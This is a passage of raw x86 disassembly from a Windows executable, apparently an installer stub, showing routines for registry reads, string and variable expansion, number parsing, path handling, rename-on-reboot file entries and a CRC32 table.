  405753:	c2 08 00             	ret    $0x8
  405756:	8b c6                	mov    %esi,%eax
  405758:	eb f6                	jmp    0x405750
  40575a:	53                   	push   %ebx
  40575b:	55                   	push   %ebp
  40575c:	56                   	push   %esi
  40575d:	57                   	push   %edi
  40575e:	6a 01                	push   $0x1
  405760:	e8 c9 05 00 00       	call   0x405d2e
  405765:	85 c0                	test   %eax,%eax
  405767:	8b 74 24 18          	mov    0x18(%esp),%esi
  40576b:	74 11                	je     0x40577e
  40576d:	6a 05                	push   $0x5
  40576f:	56                   	push   %esi
  405770:	ff 74 24 1c          	push   0x1c(%esp)
  405774:	ff d0                	call   *%eax
  405776:	85 c0                	test   %eax,%eax
  405778:	0f 85 39 01 00 00    	jne    0x4058b7
  40577e:	8b 1d 68 70 40 00    	mov    0x407068,%ebx
  405784:	c7 05 70 81 44 00 4e 	movl   $0x4c554e,0x448170
  40578b:	55 4c 00 
  40578e:	85 f6                	test   %esi,%esi
  405790:	bf 00 04 00 00       	mov    $0x400,%edi
  405795:	bd 70 81 44 00       	mov    $0x448170,%ebp
  40579a:	74 26                	je     0x4057c2
  40579c:	6a 01                	push   $0x1
  40579e:	6a 00                	push   $0x0
  4057a0:	56                   	push   %esi
  4057a1:	e8 3d ff ff ff       	call   0x4056e3
  4057a6:	50                   	push   %eax
  4057a7:	ff 15 ec 70 40 00    	call   *0x4070ec
  4057ad:	57                   	push   %edi
  4057ae:	55                   	push   %ebp
  4057af:	56                   	push   %esi
  4057b0:	ff d3                	call   *%ebx
  4057b2:	85 c0                	test   %eax,%eax
  4057b4:	0f 84 03 01 00 00    	je     0x4058bd
  4057ba:	3b c7                	cmp    %edi,%eax
  4057bc:	0f 8f fb 00 00 00    	jg     0x4058bd
  4057c2:	be e8 7b 44 00       	mov    $0x447be8,%esi
  4057c7:	57                   	push   %edi
  4057c8:	56                   	push   %esi
  4057c9:	ff 74 24 1c          	push   0x1c(%esp)
  4057cd:	ff d3                	call   *%ebx
  4057cf:	85 c0                	test   %eax,%eax
  4057d1:	0f 84 e6 00 00 00    	je     0x4058bd
  4057d7:	3b c7                	cmp    %edi,%eax
  4057d9:	0f 8f de 00 00 00    	jg     0x4058bd
  4057df:	56                   	push   %esi
  4057e0:	55                   	push   %ebp
  4057e1:	68 34 93 40 00       	push   $0x409334
  4057e6:	68 e8 77 44 00       	push   $0x4477e8
  4057eb:	ff 15 00 72 40 00    	call   *0x407200
  4057f1:	8b d8                	mov    %eax,%ebx
  4057f3:	a1 70 1b 45 00       	mov    0x451b70,%eax
  4057f8:	83 c4 10             	add    $0x10,%esp
  4057fb:	ff b0 28 01 00 00    	push   0x128(%eax)
  405801:	56                   	push   %esi
  405802:	e8 27 02 00 00       	call   0x405a2e
  405807:	6a 04                	push   $0x4
  405809:	68 00 00 00 c0       	push   $0xc0000000
  40580e:	56                   	push   %esi
  40580f:	e8 cf fe ff ff       	call   0x4056e3
  405814:	8b e8                	mov    %eax,%ebp
  405816:	83 fd ff             	cmp    $0xffffffff,%ebp
  405819:	89 6c 24 14          	mov    %ebp,0x14(%esp)
  40581d:	0f 84 94 00 00 00    	je     0x4058b7
  405823:	6a 00                	push   $0x0
  405825:	55                   	push   %ebp
  405826:	ff 15 90 70 40 00    	call   *0x407090
  40582c:	8b f8                	mov    %eax,%edi
  40582e:	8d 44 1f 0a          	lea    0xa(%edi,%ebx,1),%eax
  405832:	50                   	push   %eax
  405833:	6a 40                	push   $0x40
  405835:	ff 15 00 71 40 00    	call   *0x407100
  40583b:	8b f0                	mov    %eax,%esi
  40583d:	85 f6                	test   %esi,%esi
  40583f:	74 6f                	je     0x4058b0
  405841:	8d 44 24 18          	lea    0x18(%esp),%eax
  405845:	6a 00                	push   $0x0
  405847:	50                   	push   %eax
  405848:	57                   	push   %edi
  405849:	56                   	push   %esi
  40584a:	55                   	push   %ebp
  40584b:	ff 15 2c 71 40 00    	call   *0x40712c
  405851:	85 c0                	test   %eax,%eax
  405853:	74 5b                	je     0x4058b0
  405855:	3b 7c 24 18          	cmp    0x18(%esp),%edi
  405859:	75 55                	jne    0x4058b0
  40585b:	68 0c 73 40 00       	push   $0x40730c
  405860:	56                   	push   %esi
  405861:	e8 f2 fd ff ff       	call   0x405658
  405866:	85 c0                	test   %eax,%eax
  405868:	75 5a                	jne    0x4058c4
  40586a:	8d 04 3e             	lea    (%esi,%edi,1),%eax
  40586d:	68 0c 73 40 00       	push   $0x40730c
  405872:	50                   	push   %eax
  405873:	e8 94 01 00 00       	call   0x405a0c
  405878:	83 c7 0a             	add    $0xa,%edi
  40587b:	8b c7                	mov    %edi,%eax
  40587d:	53                   	push   %ebx
  40587e:	03 c6                	add    %esi,%eax
  405880:	68 e8 77 44 00       	push   $0x4477e8
  405885:	50                   	push   %eax
  405886:	e8 19 fe ff ff       	call   0x4056a4
  40588b:	33 c0                	xor    %eax,%eax
  40588d:	50                   	push   %eax
  40588e:	50                   	push   %eax
  40588f:	50                   	push   %eax
  405890:	55                   	push   %ebp
  405891:	ff 15 34 71 40 00    	call   *0x407134
  405897:	8d 44 24 18          	lea    0x18(%esp),%eax
  40589b:	6a 00                	push   $0x0
  40589d:	03 fb                	add    %ebx,%edi
  40589f:	50                   	push   %eax
  4058a0:	57                   	push   %edi
  4058a1:	56                   	push   %esi
  4058a2:	55                   	push   %ebp
  4058a3:	ff 15 28 71 40 00    	call   *0x407128
  4058a9:	56                   	push   %esi
  4058aa:	ff 15 fc 70 40 00    	call   *0x4070fc
  4058b0:	55                   	push   %ebp
  4058b1:	ff 15 ec 70 40 00    	call   *0x4070ec
  4058b7:	ff 05 f0 1b 45 00    	incl   0x451bf0
  4058bd:	5f                   	pop    %edi
  4058be:	5e                   	pop    %esi
  4058bf:	5d                   	pop    %ebp
  4058c0:	5b                   	pop    %ebx
  4058c1:	c2 08 00             	ret    $0x8
  4058c4:	83 c0 0a             	add    $0xa,%eax
  4058c7:	68 30 93 40 00       	push   $0x409330
  4058cc:	50                   	push   %eax
  4058cd:	e8 86 fd ff ff       	call   0x405658
  4058d2:	85 c0                	test   %eax,%eax
  4058d4:	74 a5                	je     0x40587b
  4058d6:	40                   	inc    %eax
  4058d7:	8d 0c 3e             	lea    (%esi,%edi,1),%ecx
  4058da:	3b c1                	cmp    %ecx,%eax
  4058dc:	8b e8                	mov    %eax,%ebp
  4058de:	73 0b                	jae    0x4058eb
  4058e0:	8a 55 00             	mov    0x0(%ebp),%dl
  4058e3:	88 14 2b             	mov    %dl,(%ebx,%ebp,1)
  4058e6:	45                   	inc    %ebp
  4058e7:	3b e9                	cmp    %ecx,%ebp
  4058e9:	72 f5                	jb     0x4058e0
  4058eb:	8b 6c 24 14          	mov    0x14(%esp),%ebp
  4058ef:	2b c6                	sub    %esi,%eax
  4058f1:	eb 8a                	jmp    0x40587d
  4058f3:	55                   	push   %ebp
  4058f4:	8b ec                	mov    %esp,%ebp
  4058f6:	53                   	push   %ebx
  4058f7:	8d 45 18             	lea    0x18(%ebp),%eax
  4058fa:	56                   	push   %esi
  4058fb:	50                   	push   %eax
  4058fc:	8b 45 18             	mov    0x18(%ebp),%eax
  4058ff:	33 db                	xor    %ebx,%ebx
  405901:	f7 d8                	neg    %eax
  405903:	1b c0                	sbb    %eax,%eax
  405905:	8b 75 14             	mov    0x14(%ebp),%esi
  405908:	25 00 01 00 00       	and    $0x100,%eax
  40590d:	0d 19 00 02 00       	or     $0x20019,%eax
  405912:	88 1e                	mov    %bl,(%esi)
  405914:	50                   	push   %eax
  405915:	53                   	push   %ebx
  405916:	ff 75 0c             	push   0xc(%ebp)
  405919:	ff 75 08             	push   0x8(%ebp)
  40591c:	ff 15 10 70 40 00    	call   *0x407010
  405922:	85 c0                	test   %eax,%eax
  405924:	75 3e                	jne    0x405964
  405926:	8d 45 0c             	lea    0xc(%ebp),%eax
  405929:	c7 45 0c 00 20 00 00 	movl   $0x2000,0xc(%ebp)
  405930:	50                   	push   %eax
  405931:	8d 45 14             	lea    0x14(%ebp),%eax
  405934:	56                   	push   %esi
  405935:	50                   	push   %eax
  405936:	53                   	push   %ebx
  405937:	ff 75 10             	push   0x10(%ebp)
  40593a:	ff 75 18             	push   0x18(%ebp)
  40593d:	ff 15 00 70 40 00    	call   *0x407000
  405943:	85 c0                	test   %eax,%eax
  405945:	75 0c                	jne    0x405953
  405947:	83 7d 14 01          	cmpl   $0x1,0x14(%ebp)
  40594b:	74 08                	je     0x405955
  40594d:	83 7d 14 02          	cmpl   $0x2,0x14(%ebp)
  405951:	74 02                	je     0x405955
  405953:	88 1e                	mov    %bl,(%esi)
  405955:	ff 75 18             	push   0x18(%ebp)
  405958:	88 9e ff 1f 00 00    	mov    %bl,0x1fff(%esi)
  40595e:	ff 15 1c 70 40 00    	call   *0x40701c
  405964:	5e                   	pop    %esi
  405965:	5b                   	pop    %ebx
  405966:	5d                   	pop    %ebp
  405967:	c2 14 00             	ret    $0x14
  40596a:	ff 74 24 08          	push   0x8(%esp)
  40596e:	68 18 73 40 00       	push   $0x407318
  405973:	ff 74 24 0c          	push   0xc(%esp)
  405977:	ff 15 00 72 40 00    	call   *0x407200
  40597d:	83 c4 0c             	add    $0xc,%esp
  405980:	c2 08 00             	ret    $0x8
  405983:	55                   	push   %ebp
  405984:	8b ec                	mov    %esp,%ebp
  405986:	51                   	push   %ecx
  405987:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40598a:	53                   	push   %ebx
  40598b:	56                   	push   %esi
  40598c:	57                   	push   %edi
  40598d:	33 ff                	xor    %edi,%edi
  40598f:	80 39 2d             	cmpb   $0x2d,(%ecx)
  405992:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  405999:	b0 0a                	mov    $0xa,%al
  40599b:	b3 39                	mov    $0x39,%bl
  40599d:	75 05                	jne    0x4059a4
  40599f:	41                   	inc    %ecx
  4059a0:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  4059a4:	80 39 30             	cmpb   $0x30,(%ecx)
  4059a7:	75 1c                	jne    0x4059c5
  4059a9:	41                   	inc    %ecx
  4059aa:	8a 11                	mov    (%ecx),%dl
  4059ac:	80 fa 30             	cmp    $0x30,%dl
  4059af:	7c 09                	jl     0x4059ba
  4059b1:	80 fa 37             	cmp    $0x37,%dl
  4059b4:	7f 04                	jg     0x4059ba
  4059b6:	b0 08                	mov    $0x8,%al
  4059b8:	b3 37                	mov    $0x37,%bl
  4059ba:	80 e2 df             	and    $0xdf,%dl
  4059bd:	80 fa 58             	cmp    $0x58,%dl
  4059c0:	75 03                	jne    0x4059c5
  4059c2:	b0 10                	mov    $0x10,%al
  4059c4:	41                   	inc    %ecx
  4059c5:	0f be 11             	movsbl (%ecx),%edx
  4059c8:	41                   	inc    %ecx
  4059c9:	83 fa 30             	cmp    $0x30,%edx
  4059cc:	7c 0c                	jl     0x4059da
  4059ce:	0f be f3             	movsbl %bl,%esi
  4059d1:	3b d6                	cmp    %esi,%edx
  4059d3:	7f 05                	jg     0x4059da
  4059d5:	83 ea 30             	sub    $0x30,%edx
  4059d8:	eb 19                	jmp    0x4059f3
  4059da:	3c 10                	cmp    $0x10,%al
  4059dc:	75 21                	jne    0x4059ff
  4059de:	8b f2                	mov    %edx,%esi
  4059e0:	83 e6 df             	and    $0xffffffdf,%esi
  4059e3:	83 fe 41             	cmp    $0x41,%esi
  4059e6:	7c 17                	jl     0x4059ff
  4059e8:	83 fe 46             	cmp    $0x46,%esi
  4059eb:	7f 12                	jg     0x4059ff
  4059ed:	83 e2 07             	and    $0x7,%edx
  4059f0:	83 c2 09             	add    $0x9,%edx
  4059f3:	0f be f0             	movsbl %al,%esi
  4059f6:	0f af f7             	imul   %edi,%esi
  4059f9:	03 f2                	add    %edx,%esi
  4059fb:	8b fe                	mov    %esi,%edi
  4059fd:	eb c6                	jmp    0x4059c5
  4059ff:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405a02:	0f af c7             	imul   %edi,%eax
  405a05:	5f                   	pop    %edi
  405a06:	5e                   	pop    %esi
  405a07:	5b                   	pop    %ebx
  405a08:	c9                   	leave
  405a09:	c2 04 00             	ret    $0x4
  405a0c:	68 00 20 00 00       	push   $0x2000
  405a11:	ff 74 24 0c          	push   0xc(%esp)
  405a15:	ff 74 24 0c          	push   0xc(%esp)
  405a19:	ff 15 b8 70 40 00    	call   *0x4070b8
  405a1f:	c2 08 00             	ret    $0x8
  405a22:	ff 25 dc 70 40 00    	jmp    *0x4070dc
  405a28:	ff 25 e0 70 40 00    	jmp    *0x4070e0
  405a2e:	55                   	push   %ebp
  405a2f:	8b ec                	mov    %esp,%ebp
  405a31:	83 ec 18             	sub    $0x18,%esp
  405a34:	8b 45 0c             	mov    0xc(%ebp),%eax
  405a37:	85 c0                	test   %eax,%eax
  405a39:	7d 11                	jge    0x405a4c
  405a3b:	8b 0d 3c db 44 00    	mov    0x44db3c,%ecx
  405a41:	8d 04 85 04 00 00 00 	lea    0x4(,%eax,4),%eax
  405a48:	2b c8                	sub    %eax,%ecx
  405a4a:	8b 01                	mov    (%ecx),%eax
  405a4c:	8b 0d 98 1b 45 00    	mov    0x451b98,%ecx
  405a52:	8b 55 08             	mov    0x8(%ebp),%edx
  405a55:	03 c8                	add    %eax,%ecx
  405a57:	b8 00 9b 44 00       	mov    $0x449b00,%eax
  405a5c:	53                   	push   %ebx
  405a5d:	2b d0                	sub    %eax,%edx
  405a5f:	56                   	push   %esi
  405a60:	57                   	push   %edi
  405a61:	81 fa 00 40 00 00    	cmp    $0x4000,%edx
  405a67:	8b f8                	mov    %eax,%edi
  405a69:	0f 83 dc 01 00 00    	jae    0x405c4b
  405a6f:	8b 7d 08             	mov    0x8(%ebp),%edi
  405a72:	83 65 08 00          	andl   $0x0,0x8(%ebp)
  405a76:	e9 d0 01 00 00       	jmp    0x405c4b
  405a7b:	8b f7                	mov    %edi,%esi
  405a7d:	2b f0                	sub    %eax,%esi
  405a7f:	81 fe 00 20 00 00    	cmp    $0x2000,%esi
  405a85:	0f 8d ca 01 00 00    	jge    0x405c55
  405a8b:	41                   	inc    %ecx
  405a8c:	80 fa fc             	cmp    $0xfc,%dl
  405a8f:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  405a92:	0f 86 a6 01 00 00    	jbe    0x405c3e
  405a98:	0f be 41 01          	movsbl 0x1(%ecx),%eax
  405a9c:	0f be 09             	movsbl (%ecx),%ecx
  405a9f:	8b f0                	mov    %eax,%esi
  405aa1:	8b d9                	mov    %ecx,%ebx
  405aa3:	83 e6 7f             	and    $0x7f,%esi
  405aa6:	83 e3 7f             	and    $0x7f,%ebx
  405aa9:	c1 e6 07             	shl    $0x7,%esi
  405aac:	0b f3                	or     %ebx,%esi
  405aae:	8b d9                	mov    %ecx,%ebx
  405ab0:	83 45 0c 02          	addl   $0x2,0xc(%ebp)
  405ab4:	80 cf 80             	or     $0x80,%bh
  405ab7:	89 5d e8             	mov    %ebx,-0x18(%ebp)
  405aba:	8b d9                	mov    %ecx,%ebx
  405abc:	8b c8                	mov    %eax,%ecx
  405abe:	89 5d ec             	mov    %ebx,-0x14(%ebp)
  405ac1:	80 cd 80             	or     $0x80,%ch
  405ac4:	80 fa fe             	cmp    $0xfe,%dl
  405ac7:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  405aca:	89 45 f4             	mov    %eax,-0xc(%ebp)
  405acd:	0f 85 15 01 00 00    	jne    0x405be8
  405ad3:	6a 02                	push   $0x2
  405ad5:	5e                   	pop    %esi
  405ad6:	ff 15 e8 70 40 00    	call   *0x4070e8
  405adc:	85 c0                	test   %eax,%eax
  405ade:	79 18                	jns    0x405af8
  405ae0:	66 3d 04 5a          	cmp    $0x5a04,%ax
  405ae4:	74 12                	je     0x405af8
  405ae6:	83 7d f4 23          	cmpl   $0x23,-0xc(%ebp)
  405aea:	74 0c                	je     0x405af8
  405aec:	83 7d f4 2e          	cmpl   $0x2e,-0xc(%ebp)
  405af0:	74 06                	je     0x405af8
  405af2:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  405af6:	eb 07                	jmp    0x405aff
  405af8:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  405aff:	83 3d e4 1b 45 00 00 	cmpl   $0x0,0x451be4
  405b06:	74 03                	je     0x405b0b
  405b08:	6a 04                	push   $0x4
  405b0a:	5e                   	pop    %esi
  405b0b:	84 db                	test   %bl,%bl
  405b0d:	79 37                	jns    0x405b46
  405b0f:	8b c3                	mov    %ebx,%eax
  405b11:	83 e3 3f             	and    $0x3f,%ebx
  405b14:	03 1d 98 1b 45 00    	add    0x451b98,%ebx
  405b1a:	83 e0 40             	and    $0x40,%eax
  405b1d:	50                   	push   %eax
  405b1e:	57                   	push   %edi
  405b1f:	53                   	push   %ebx
  405b20:	68 1c 73 40 00       	push   $0x40731c
  405b25:	68 02 00 00 80       	push   $0x80000002
  405b2a:	e8 c4 fd ff ff       	call   0x4058f3
  405b2f:	80 3f 00             	cmpb   $0x0,(%edi)
  405b32:	0f 85 97 00 00 00    	jne    0x405bcf
  405b38:	ff 75 f4             	push   -0xc(%ebp)
  405b3b:	57                   	push   %edi
  405b3c:	e8 ed fe ff ff       	call   0x405a2e
  405b41:	e9 84 00 00 00       	jmp    0x405bca
  405b46:	83 fb 25             	cmp    $0x25,%ebx
  405b49:	75 0e                	jne    0x405b59
  405b4b:	68 00 20 00 00       	push   $0x2000
  405b50:	57                   	push   %edi
  405b51:	ff 15 e4 70 40 00    	call   *0x4070e4
  405b57:	eb 71                	jmp    0x405bca
  405b59:	83 fb 24             	cmp    $0x24,%ebx
  405b5c:	75 68                	jne    0x405bc6
  405b5e:	68 00 20 00 00       	push   $0x2000
  405b63:	57                   	push   %edi
  405b64:	ff 15 a4 70 40 00    	call   *0x4070a4
  405b6a:	33 f6                	xor    %esi,%esi
  405b6c:	eb 58                	jmp    0x405bc6
  405b6e:	a1 64 1b 45 00       	mov    0x451b64,%eax
  405b73:	33 c9                	xor    %ecx,%ecx
  405b75:	4e                   	dec    %esi
  405b76:	3b c1                	cmp    %ecx,%eax
  405b78:	74 18                	je     0x405b92
  405b7a:	39 4d fc             	cmp    %ecx,-0x4(%ebp)
  405b7d:	74 13                	je     0x405b92
  405b7f:	57                   	push   %edi
  405b80:	51                   	push   %ecx
  405b81:	51                   	push   %ecx
  405b82:	ff 74 b5 e8          	push   -0x18(%ebp,%esi,4)
  405b86:	ff 35 68 1b 45 00    	push   0x451b68
  405b8c:	ff d0                	call   *%eax
  405b8e:	85 c0                	test   %eax,%eax
  405b90:	74 38                	je     0x405bca
  405b92:	8d 45 f8             	lea    -0x8(%ebp),%eax
  405b95:	50                   	push   %eax
  405b96:	ff 74 b5 e8          	push   -0x18(%ebp,%esi,4)
  405b9a:	ff 35 68 1b 45 00    	push   0x451b68
  405ba0:	ff 15 64 71 40 00    	call   *0x407164
  405ba6:	85 c0                	test   %eax,%eax
  405ba8:	75 19                	jne    0x405bc3
  405baa:	57                   	push   %edi
  405bab:	ff 75 f8             	push   -0x8(%ebp)
  405bae:	ff 15 50 71 40 00    	call   *0x407150
  405bb4:	ff 75 f8             	push   -0x8(%ebp)
  405bb7:	8b d8                	mov    %eax,%ebx
  405bb9:	ff 15 78 72 40 00    	call   *0x407278
  405bbf:	85 db                	test   %ebx,%ebx
  405bc1:	75 07                	jne    0x405bca
  405bc3:	80 27 00             	andb   $0x0,(%edi)
  405bc6:	85 f6                	test   %esi,%esi
  405bc8:	75 a4                	jne    0x405b6e
  405bca:	80 3f 00             	cmpb   $0x0,(%edi)
  405bcd:	74 11                	je     0x405be0
  405bcf:	83 7d f4 1a          	cmpl   $0x1a,-0xc(%ebp)
  405bd3:	75 0b                	jne    0x405be0
  405bd5:	68 48 73 40 00       	push   $0x407348
  405bda:	57                   	push   %edi
  405bdb:	e8 48 fe ff ff       	call   0x405a28
  405be0:	57                   	push   %edi
  405be1:	e8 88 00 00 00       	call   0x405c6e
  405be6:	eb 44                	jmp    0x405c2c
  405be8:	80 fa fd             	cmp    $0xfd,%dl
  405beb:	75 2e                	jne    0x405c1b
  405bed:	83 fe 1d             	cmp    $0x1d,%esi
  405bf0:	75 0e                	jne    0x405c00
  405bf2:	ff 35 68 1b 45 00    	push   0x451b68
  405bf8:	57                   	push   %edi
  405bf9:	e8 6c fd ff ff       	call   0x40596a
  405bfe:	eb 11                	jmp    0x405c11
  405c00:	8b c6                	mov    %esi,%eax
  405c02:	c1 e0 0d             	shl    $0xd,%eax
  405c05:	05 00 20 45 00       	add    $0x452000,%eax
  405c0a:	50                   	push   %eax
  405c0b:	57                   	push   %edi
  405c0c:	e8 fb fd ff ff       	call   0x405a0c
  405c11:	83 c6 eb             	add    $0xffffffeb,%esi
  405c14:	83 fe 07             	cmp    $0x7,%esi
  405c17:	73 13                	jae    0x405c2c
  405c19:	eb c5                	jmp    0x405be0
  405c1b:	80 fa ff             	cmp    $0xff,%dl
  405c1e:	75 0c                	jne    0x405c2c
  405c20:	83 c8 ff             	or     $0xffffffff,%eax
  405c23:	2b c6                	sub    %esi,%eax
  405c25:	50                   	push   %eax
  405c26:	57                   	push   %edi
  405c27:	e8 02 fe ff ff       	call   0x405a2e
  405c2c:	57                   	push   %edi
  405c2d:	e8 f0 fd ff ff       	call   0x405a22
  405c32:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  405c35:	03 f8                	add    %eax,%edi
  405c37:	b8 00 9b 44 00       	mov    $0x449b00,%eax
  405c3c:	eb 0d                	jmp    0x405c4b
  405c3e:	75 08                	jne    0x405c48
  405c40:	8a 11                	mov    (%ecx),%dl
  405c42:	88 17                	mov    %dl,(%edi)
  405c44:	47                   	inc    %edi
  405c45:	41                   	inc    %ecx
  405c46:	eb 03                	jmp    0x405c4b
  405c48:	88 17                	mov    %dl,(%edi)
  405c4a:	47                   	inc    %edi
  405c4b:	8a 11                	mov    (%ecx),%dl
  405c4d:	84 d2                	test   %dl,%dl
  405c4f:	0f 85 26 fe ff ff    	jne    0x405a7b
  405c55:	80 27 00             	andb   $0x0,(%edi)
  405c58:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  405c5c:	5f                   	pop    %edi
  405c5d:	5e                   	pop    %esi
  405c5e:	5b                   	pop    %ebx
  405c5f:	74 09                	je     0x405c6a
  405c61:	50                   	push   %eax
  405c62:	ff 75 08             	push   0x8(%ebp)
  405c65:	e8 a2 fd ff ff       	call   0x405a0c
  405c6a:	c9                   	leave
  405c6b:	c2 08 00             	ret    $0x8
  405c6e:	53                   	push   %ebx
  405c6f:	56                   	push   %esi
  405c70:	8b 74 24 0c          	mov    0xc(%esp),%esi
  405c74:	57                   	push   %edi
  405c75:	80 3e 5c             	cmpb   $0x5c,(%esi)
  405c78:	75 15                	jne    0x405c8f
  405c7a:	80 7e 01 5c          	cmpb   $0x5c,0x1(%esi)
  405c7e:	75 0f                	jne    0x405c8f
  405c80:	80 7e 02 3f          	cmpb   $0x3f,0x2(%esi)
  405c84:	75 09                	jne    0x405c8f
  405c86:	80 7e 03 5c          	cmpb   $0x5c,0x3(%esi)
  405c8a:	75 03                	jne    0x405c8f
  405c8c:	83 c6 04             	add    $0x4,%esi
  405c8f:	80 3e 00             	cmpb   $0x0,(%esi)
  405c92:	74 0c                	je     0x405ca0
  405c94:	56                   	push   %esi
  405c95:	e8 d2 f8 ff ff       	call   0x40556c
  405c9a:	85 c0                	test   %eax,%eax
  405c9c:	74 02                	je     0x405ca0
  405c9e:	46                   	inc    %esi
  405c9f:	46                   	inc    %esi
  405ca0:	8a 06                	mov    (%esi),%al
  405ca2:	8b de                	mov    %esi,%ebx
  405ca4:	84 c0                	test   %al,%al
  405ca6:	8b fe                	mov    %esi,%edi
  405ca8:	74 39                	je     0x405ce3
  405caa:	55                   	push   %ebp
  405cab:	8b 2d 1c 72 40 00    	mov    0x40721c,%ebp
  405cb1:	3c 1f                	cmp    $0x1f,%al
  405cb3:	76 22                	jbe    0x405cd7
  405cb5:	50                   	push   %eax
  405cb6:	68 3c 93 40 00       	push   $0x40933c
  405cbb:	e8 6a f8 ff ff       	call   0x40552a
  405cc0:	80 38 00             	cmpb   $0x0,(%eax)
  405cc3:	75 12                	jne    0x405cd7
  405cc5:	56                   	push   %esi
  405cc6:	ff d5                	call   *%ebp
  405cc8:	2b c6                	sub    %esi,%eax
  405cca:	50                   	push   %eax
  405ccb:	56                   	push   %esi
  405ccc:	57                   	push   %edi
  405ccd:	e8 d2 f9 ff ff       	call   0x4056a4
  405cd2:	57                   	push   %edi
  405cd3:	ff d5                	call   *%ebp
  405cd5:	8b f8                	mov    %eax,%edi
  405cd7:	56                   	push   %esi
  405cd8:	ff d5                	call   *%ebp
  405cda:	8b f0                	mov    %eax,%esi
  405cdc:	8a 06                	mov    (%esi),%al
  405cde:	84 c0                	test   %al,%al
  405ce0:	75 cf                	jne    0x405cb1
  405ce2:	5d                   	pop    %ebp
  405ce3:	80 27 00             	andb   $0x0,(%edi)
  405ce6:	57                   	push   %edi
  405ce7:	53                   	push   %ebx
  405ce8:	ff 15 dc 71 40 00    	call   *0x4071dc
  405cee:	8b f8                	mov    %eax,%edi
  405cf0:	8a 07                	mov    (%edi),%al
  405cf2:	3c 20                	cmp    $0x20,%al
  405cf4:	74 04                	je     0x405cfa
  405cf6:	3c 5c                	cmp    $0x5c,%al
  405cf8:	75 07                	jne    0x405d01
  405cfa:	80 27 00             	andb   $0x0,(%edi)
  405cfd:	3b df                	cmp    %edi,%ebx
  405cff:	72 e5                	jb     0x405ce6
  405d01:	5f                   	pop    %edi
  405d02:	5e                   	pop    %esi
  405d03:	5b                   	pop    %ebx
  405d04:	c2 04 00             	ret    $0x4
  405d07:	56                   	push   %esi
  405d08:	be 30 80 44 00       	mov    $0x448030,%esi
  405d0d:	56                   	push   %esi
  405d0e:	ff 74 24 0c          	push   0xc(%esp)
  405d12:	ff 15 40 71 40 00    	call   *0x407140
  405d18:	83 f8 ff             	cmp    $0xffffffff,%eax
  405d1b:	74 0b                	je     0x405d28
  405d1d:	50                   	push   %eax
  405d1e:	ff 15 38 71 40 00    	call   *0x407138
  405d24:	8b c6                	mov    %esi,%eax
  405d26:	eb 02                	jmp    0x405d2a
  405d28:	33 c0                	xor    %eax,%eax
  405d2a:	5e                   	pop    %esi
  405d2b:	c2 04 00             	ret    $0x4
  405d2e:	8b 44 24 04          	mov    0x4(%esp),%eax
  405d32:	56                   	push   %esi
  405d33:	8b f0                	mov    %eax,%esi
  405d35:	57                   	push   %edi
  405d36:	c1 e6 03             	shl    $0x3,%esi
  405d39:	8b be 00 92 40 00    	mov    0x409200(%esi),%edi
  405d3f:	57                   	push   %edi
  405d40:	ff 15 0c 71 40 00    	call   *0x40710c
  405d46:	85 c0                	test   %eax,%eax
  405d48:	75 0b                	jne    0x405d55
  405d4a:	57                   	push   %edi
  405d4b:	ff 15 b4 70 40 00    	call   *0x4070b4
  405d51:	85 c0                	test   %eax,%eax
  405d53:	74 0d                	je     0x405d62
  405d55:	ff b6 04 92 40 00    	push   0x409204(%esi)
  405d5b:	50                   	push   %eax
  405d5c:	ff 15 14 71 40 00    	call   *0x407114
  405d62:	5f                   	pop    %edi
  405d63:	5e                   	pop    %esi
  405d64:	c2 04 00             	ret    $0x4
  405d67:	55                   	push   %ebp
  405d68:	8b ec                	mov    %esp,%ebp
  405d6a:	83 ec 1c             	sub    $0x1c,%esp
  405d6d:	56                   	push   %esi
  405d6e:	8b 75 08             	mov    0x8(%ebp),%esi
  405d71:	57                   	push   %edi
  405d72:	8b 3d e4 71 40 00    	mov    0x4071e4,%edi
  405d78:	eb 0a                	jmp    0x405d84
  405d7a:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  405d7d:	50                   	push   %eax
  405d7e:	ff 15 e0 71 40 00    	call   *0x4071e0
  405d84:	6a 01                	push   $0x1
  405d86:	56                   	push   %esi
  405d87:	56                   	push   %esi
  405d88:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  405d8b:	6a 00                	push   $0x0
  405d8d:	50                   	push   %eax
  405d8e:	ff d7                	call   *%edi
  405d90:	85 c0                	test   %eax,%eax
  405d92:	75 e6                	jne    0x405d7a
  405d94:	5f                   	pop    %edi
  405d95:	5e                   	pop    %esi
  405d96:	c9                   	leave
  405d97:	c2 04 00             	ret    $0x4
  405d9a:	83 3d 74 85 44 00 00 	cmpl   $0x0,0x448574
  405da1:	56                   	push   %esi
  405da2:	75 2d                	jne    0x405dd1
  405da4:	33 c9                	xor    %ecx,%ecx
  405da6:	6a 08                	push   $0x8
  405da8:	8b c1                	mov    %ecx,%eax
  405daa:	5e                   	pop    %esi
  405dab:	8b d0                	mov    %eax,%edx
  405dad:	80 e2 01             	and    $0x1,%dl
  405db0:	f6 da                	neg    %dl
  405db2:	1b d2                	sbb    %edx,%edx
  405db4:	81 e2 20 83 b8 ed    	and    $0xedb88320,%edx
  405dba:	d1 e8                	shr    $1,%eax
  405dbc:	33 c2                	xor    %edx,%eax
  405dbe:	4e                   	dec    %esi
  405dbf:	75 ea                	jne    0x405dab
  405dc1:	89 04 8d 70 85 44 00 	mov    %eax,0x448570(,%ecx,4)
  405dc8:	41                   	inc    %ecx
  405dc9:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  405dcf:	7c d5                	jl     0x405da6
  405dd1:	8b 54 24 10          	mov    0x10(%esp),%edx
  405dd5:	8b 44 24 08          	mov    0x8(%esp),%eax
  405dd9:	85 d2                	test   %edx,%edx
  405ddb:	f7 d0                	not    %eax
  405ddd:	76 23                	jbe    0x405e02
  405ddf:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  405de3:	57                   	push   %edi
  405de4:	0f b6 39             	movzbl (%ecx),%edi
